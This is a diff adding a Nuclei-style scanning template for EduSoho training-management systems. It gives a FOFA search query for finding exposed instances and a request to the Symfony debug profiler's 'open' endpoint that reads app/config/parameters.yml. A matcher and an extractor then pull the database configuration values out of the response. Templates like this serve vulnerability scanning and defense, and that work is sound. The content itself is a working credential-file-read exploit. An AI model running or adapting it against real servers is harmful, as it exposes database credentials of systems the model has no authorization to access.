@@ -1,0 +1,30 @@
+id: edusoho-openfile-readfile
+
+info:
+  name: EduSoho 教培系统 openfile - readfile
+  author: msk
+  severity: high
+  description: 
+  reference: 
+    - todo
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="Powered By EduSoho" || body="www.edusoho.com"
+  tags: edusoho,fileread
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/app_dev.php/_profiler/open?file=app/config/parameters.yml"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"database_")
+
+    extractors:
+      - type: xpath
+        part: body
+        xpath:
+          -  //li/code[contains(text(), 'database_')]/text()
